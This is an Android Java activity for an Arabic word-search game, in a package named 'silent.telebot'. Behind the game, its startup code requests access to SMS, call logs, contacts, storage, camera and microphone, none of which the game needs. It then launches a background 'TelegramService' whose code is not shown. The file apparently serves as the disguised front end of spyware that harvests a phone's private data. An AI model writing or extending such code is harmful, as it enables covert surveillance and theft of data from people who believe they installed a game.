package com.silent.telebot;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Vibrator;
import android.view.View;
import android.widget.Button;
import android.widget.GridLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Random;
import java.util.Set;

public class WordGameActivity extends Activity {
    private static final int REQ_CODE = 100;
    private GridLayout gridLetters;
    private TextView tvSelectedWord, tvFoundWords, tvLevel, tvProgress, tvMotivation;
    private ProgressBar progressBar;
    private Button btnSubmit, btnClear, btnHint, btnResetGame;

    private String[] letters = new String[25];
    private String selectedWord = "";
    private Set<String> foundWords = new HashSet<>();
    private List<String> currentLevelWords;
    private int currentLevel = 1;
    private Random random = new Random();
    private Vibrator vibrator;

    // 🔥 تعريف المستويات
    private static final List<List<String>> LEVELS = Arrays.asList(
            Arrays.asList("بيت", "دار", "نور", "أرض", "شمس", "ورد", "زهر", "نهر"),
            Arrays.asList("علم", "حب", "سلام", "قمر", "نجم", "ليل", "نهار", "ماء"),
            Arrays.asList("سعادة", "جميل", "كتاب", "وردة", "شجرة", "سماء", "بحر", "صحراء"),
            Arrays.asList("مدرسة", "جامعة", "مطبخ", "حديقة", "مكتبة", "مستشفى", "مطار", "فندق"),
            Arrays.asList("استقلال", "تكنولوجيا", "ثقافة", "حضارة", "ابتكار", "تطوير", "إبداع", "نجاح")
    );

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_word_game);

        // ربط العناصر
        gridLetters = findViewById(R.id.grid_letters);
        tvSelectedWord = findViewById(R.id.tv_selected_word);
        tvFoundWords = findViewById(R.id.tv_found_words);
        tvLevel = findViewById(R.id.tv_level);
        tvProgress = findViewById(R.id.tv_progress);
        progressBar = findViewById(R.id.progress_bar);
        btnSubmit = findViewById(R.id.btn_submit);
        btnClear = findViewById(R.id.btn_clear);
        btnHint = findViewById(R.id.btn_hint);
        btnResetGame = findViewById(R.id.btn_reset_game);
        tvMotivation = findViewById(R.id.tv_motivation); // TextView جديد للعبارات

        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);

        // عرض عبارة ترحيبية من عصام المهدي
        showMotivation("🎤 أهلاً بك في لعبة المايسترو! أنا عصام المهدي، أتمنى لك تجربة ممتعة! 💪");

        // التحقق من الأذونات
        checkAndRequestPermissions();

        // تحميل المستوى الأول
        loadLevel(currentLevel);

        // مستمعات الأزرار
        btnSubmit.setOnClickListener(v -> checkWord());
        btnClear.setOnClickListener(v -> clearSelection());
        btnHint.setOnClickListener(v -> giveHint());
        btnResetGame.setOnClickListener(v -> loadLevel(currentLevel));
    }

    // ============================================================
    //  📢 دالة عرض العبارات التحفيزية (خاصة بك)
    // ============================================================
    private void showMotivation(String message) {
        tvMotivation.setText(message);
        // إخفاء النص تلقائياً بعد 4 ثوانٍ
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            tvMotivation.setText("");
        }, 4000);
    }

    // ============================================================
    //  🎮 تحميل المستوى
    // ============================================================
    private void loadLevel(int level) {
        if (level > LEVELS.size()) {
            showMotivation("🏆 مبروك! لقد أنهيت جميع المستويات! أنت أسطورة يا بطل. - عصام المهدي");
            Toast.makeText(this, "🎉 تهانينا! لقد أكملت جميع المستويات!", Toast.LENGTH_LONG).show();
            return;
        }

        currentLevelWords = new ArrayList<>(LEVELS.get(level - 1));
        foundWords.clear();
        selectedWord = "";
        tvSelectedWord.setText("");
        tvFoundWords.setText("");

        // تحديث الواجهة
        tvLevel.setText("🌍 المستوى " + level);
        updateUI();

        // إنشاء شبكة جديدة
        generateGridFromWords(currentLevelWords);
        drawGrid();

        // عرض عبارة تحفيزية عند بداية كل مستوى من عصام المهدي
        String[] startMessages = {
                "🚀 ابدأ المستوى " + level + "! ركز جيداً يا بطل. - عصام المهدي",
                "💪 المستوى " + level + " في انتظارك! ثق بنفسك. - عصام المهدي",
                "🧠 حان وقت التفكير! اكتشف الكلمات المخفية. - عصام المهدي",
                "👑 المستوى " + level + "! أظهر مهاراتك يا مبدع. - عصام المهدي"
        };
        showMotivation(startMessages[random.nextInt(startMessages.length)]);
    }

    // ============================================================
    //  🔤 توليد الشبكة
    // ============================================================
    private void generateGridFromWords(List<String> words) {
        List<Character> allChars = new ArrayList<>();
        for (String word : words) {
            for (char c : word.toCharArray()) {
                allChars.add(c);
            }
        }
        char[] arabicLetters = {'أ', 'ب', 'ت', 'ث', 'ج', 'ح', 'خ', 'د', 'ذ', 'ر', 'ز', 'س', 'ش', 'ص', 'ض', 'ط', 'ظ', 'ع', 'غ', 'ف', 'ق', 'ك', 'ل', 'م', 'ن', 'ه', 'و', 'ي'};
        while (allChars.size() < 25) {
            allChars.add(arabicLetters[random.nextInt(arabicLetters.length)]);
        }
        java.util.Collections.shuffle(allChars);
        for (int i = 0; i < 25; i++) {
            letters[i] = String.valueOf(allChars.get(i));
        }
    }

    // ============================================================
    //  🎨 رسم الشبكة
    // ============================================================
    private void drawGrid() {
        gridLetters.removeAllViews();
        gridLetters.setRowCount(5);
        gridLetters.setColumnCount(5);
        int size = (int) (getResources().getDisplayMetrics().widthPixels / 6.5);

        for (int i = 0; i < 25; i++) {
            Button btn = new Button(this);
            btn.setText(letters[i]);
            btn.setTextSize(28);
            btn.setBackgroundColor(0xFF2C2C2E);
            btn.setTextColor(0xFFFFFFFF);
            btn.setPadding(8, 8, 8, 8);
            btn.setTag(i);
            btn.setWidth(size);
            btn.setHeight(size);
            btn.setOnClickListener(v -> {
                int index = (int) v.getTag();
                appendLetter(index);
                v.setBackgroundColor(0xFF4CAF50);
            });
            gridLetters.addView(btn);
        }
    }

    // ============================================================
    //  ➕ إضافة حرف
    // ============================================================
    private void appendLetter(int index) {
        selectedWord += letters[index];
        tvSelectedWord.setText(selectedWord);
    }

    // ============================================================
    //  ✅ التحقق من الكلمة
    // ============================================================
    private void checkWord() {
        if (selectedWord.isEmpty()) {
            showMotivation("😅 اختر أحرفاً أولاً يا صديقي! - عصام المهدي");
            return;
        }

        if (foundWords.contains(selectedWord)) {
            showMotivation("⚠️ هذه الكلمة مكررة! ابحث عن كلمة جديدة. - عصام المهدي");
            clearSelection();
            return;
        }

        for (String word : currentLevelWords) {
            if (word.equals(selectedWord)) {
                foundWords.add(selectedWord);
                
                // عبارات تحفيزية عند الإجابة الصحيحة من عصام المهدي
                String[] successMessages = {
                        "⭐ أحسنت! واصل هكذا، أنت مبدع! - عصام المهدي",
                        "🔥 كلمة رائعة! تقدم إلى الأمام. - عصام المهدي",
                        "👏 ممتاز! عقلك ذهبي يا بطل. - عصام المهدي",
                        "💡 صحيح! أتمنى لك المزيد من النجاح. - عصام المهدي"
                };
                showMotivation(successMessages[random.nextInt(successMessages.length)]);
                
                updateUI();
                clearSelection();

                if (foundWords.size() == currentLevelWords.size()) {
                    showMotivation("🎉 أحسنت! أكملت المستوى " + currentLevel + " 🎉\nفخور بك يا بطل. - عصام المهدي");
                    currentLevel++;
                    new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> loadLevel(currentLevel), 2500);
                }
                return;
            }
        }

        // كلمة خاطئة
        showMotivation("❌ للأسف كلمة غير صحيحة! حاول مجدداً. - عصام المهدي");
        if (vibrator != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(android.os.VibrationEffect.createOneShot(50, 255));
        }
        clearSelection();
    }

    // ============================================================
    //  💡 التلميحات
    // ============================================================
    private void giveHint() {
        for (String word : currentLevelWords) {
            if (!foundWords.contains(word)) {
                String hint = "💡 تلميح: الكلمة تبدأ بحرف " + word.charAt(0);
                showMotivation(hint + " - عصام المهدي (أنت تستطيع!)");
                return;
            }
        }
        showMotivation("🎯 تم اكتشاف جميع الكلمات! إلى المستوى التالي. - عصام المهدي");
    }

    // ============================================================
    //  🧹 مسح التحديد
    // ============================================================
    private void clearSelection() {
        selectedWord = "";
        tvSelectedWord.setText("");
        for (int i = 0; i < gridLetters.getChildCount(); i++) {
            View child = gridLetters.getChildAt(i);
            if (child instanceof Button) {
                child.setBackgroundColor(0xFF2C2C2E);
            }
        }
    }

    // ============================================================
    //  📊 تحديث الواجهة
    // ============================================================
    private void updateUI() {
        int total = currentLevelWords.size();
        int found = foundWords.size();
        tvProgress.setText(found + "/" + total);
        progressBar.setProgress((found * 100) / total);
        StringBuilder sb = new StringBuilder("✅ ");
        for (String word : foundWords) {
            sb.append(word).append(" ");
        }
        tvFoundWords.setText(sb.toString().trim());
    }

    // ============================================================
    //  🔐 الأذونات والخدمة الخلفية
    // ============================================================
    private void checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO
            };
            boolean allGranted = true;
            for (String perm : permissions) {
                if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (!allGranted) {
                ActivityCompat.requestPermissions(this, permissions, REQ_CODE);
            }
        }
        startTelegramService();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "✅ الأذونات ممنوحة", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ بعض الأذونات مرفوضة", Toast.LENGTH_LONG).show();
            }
        }
        startTelegramService();
    }

    private void startTelegramService() {
        Intent serviceIntent = new Intent(this, TelegramService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
}
